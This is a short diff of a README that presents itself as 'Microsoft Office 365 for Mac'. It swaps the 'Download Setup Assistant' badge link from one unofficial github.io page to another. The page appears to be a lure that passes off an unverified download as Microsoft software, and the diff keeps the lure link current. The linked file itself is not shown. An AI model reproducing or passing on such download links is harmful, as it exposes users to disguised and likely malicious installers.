@@ -1,6 +1,6 @@
 # Microsoft Office 365 for Mac 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://shuziktobehuman.github.io/huja/MicrosoftOffice)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://mitrobandus.github.io/.github/MicrosoftOffice)
 
 ## 📦 How to Install
 
